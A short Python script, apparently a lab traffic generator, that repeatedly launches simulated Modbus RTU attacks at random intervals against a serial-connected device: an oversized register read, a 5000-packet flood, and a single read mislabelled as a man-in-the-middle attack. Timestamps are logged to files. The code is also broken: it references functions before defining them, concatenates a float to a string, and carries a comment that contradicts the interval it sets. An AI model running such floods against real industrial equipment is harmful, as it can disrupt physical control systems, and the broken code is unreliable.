#!/usr/bin/env python

from pymodbus.client.sync import ModbusSerialClient as ModbusClient
import logging

import time
import random


functions = [False_Packet_Attack, begin_flood, mitm_attack]

logging.basicConfig()
log = logging.getLogger()
log.setLevel(logging.DEBUG)

def False_Packet_Attack():
    client = ModbusClient(method='rtu', port='/dev/ttyUSB0',stopbits = 1, bytesize = 8, parity = 'N', baudrate= 9600)
    client.connect()
    try:
        client.read_input_registers(1, 2100, unit=20)
    except:
        pass
    
    print("Modbus False Packet Send Attempted \n")
    print("Time Stamp: " + time.time())
    with open("modbus_false_packet.txt", "a") as f:  # open the file in append mode
        f.write(str(time.time()) + "\n")  # write the current timestamp to the file then a new line


def begin_flood():
    client = ModbusClient(method='rtu', port='/dev/ttyUSB0',stopbits = 1, bytesize = 8, parity = 'N', baudrate= 9600)
    client.connect()
    for i in range(5000):
        client.read_input_registers(1, 21, unit=20)

    print("Modbus Network Flood Attempted - sent 5000 packets \n")
    print("Time Stamp: " + time.time())
    with open("modbus_floods.txt", "a") as f:  # open the file in append mode
        f.write(str(time.time()) + "\n")  # write the current timestamp to the file then a new line
        
def mitm_attack():
    client = ModbusClient(method='rtu', port='/dev/ttyUSB0',stopbits = 1, bytesize = 8, parity = 'N', baudrate= 9600)
    client.connect()
    client.read_input_registers(1, 21, unit=20)

    print("Modbus MITM Attempted \n")
    print("Time Stamp: " + time.time())
    with open("modbus_mitm.txt", "a") as f:  # open the file in append mode
        f.write(str(time.time()) + "\n")  # write the current timestamp to the file then a new line

while True:
    # Generate a random interval between 1 seconds and 30 seconds
    random_interval = random.uniform(20, 60)
    print(f"Interval generated... Waiting {random_interval:.2f} seconds before running attack")
    time.sleep(random_interval)
    func = random.choice(functions)
    func()
